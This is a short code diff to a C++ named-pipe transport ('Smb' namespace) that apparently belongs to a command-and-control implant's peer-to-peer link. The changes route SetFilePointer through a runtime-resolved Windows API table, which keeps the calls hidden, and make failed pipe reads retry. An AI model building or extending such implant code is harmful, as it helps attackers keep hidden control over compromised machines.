@@ -346,7 +346,7 @@ namespace Smb {
         uint32_t total = 0;
 
         do {
-            auto length     = MIN((in->length - total), PIPE_BUFFER_MAX);
+            auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
 
             if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
@@ -395,7 +395,7 @@ namespace Smb {
                 auto total = S_CAST(int32_t, 0x10 + header.length);
                 current += total;
 
-                SetFilePointer(handle, current, nullptr, FILE_CURRENT);
+                Ctx->win32.SetFilePointer(handle, current, nullptr, FILE_CURRENT);
             } else {
                 x_memcpy(&stream , &header, 0x10);
                 x_memcpy(&offset , &current, sizeof(int32_t));
@@ -440,13 +440,14 @@ namespace Smb {
                     x_memcpy(&queue->length      , &search.length, sizeof(uint32_t));
                     x_memset(&search             , 0, sizeof(_stream));
 
-                    SetFilePointer(peer->ingress_handle, offset, nullptr, FILE_BEGIN);
+                    Ctx->win32.SetFilePointer(peer->ingress_handle, offset, nullptr, FILE_BEGIN);
                     queue->buffer = B_PTR(x_malloc(queue->length));
 
                     if (!PipeRead(peer->ingress_handle, queue)) {
+                        Ctx->win32.SetFilePointer(peer->ingress_handle, 0, nullptr, FILE_BEGIN);
                         x_free(queue->buffer);
                         x_free(queue);
-                        return_defer(ntstatus);
+                        continue;
                     }
 
                     Dispatcher::OutboundQueue(queue);
@@ -467,7 +468,7 @@ namespace Smb {
                 peer = peer->next;
                 head = Ctx->transport.outbound_queue;
 
-                SetFilePointer(peer->ingress_handle, 0, nullptr, FILE_BEGIN);
+                Ctx->win32.SetFilePointer(peer->ingress_handle, 0, nullptr, FILE_BEGIN);
             }
         }
 
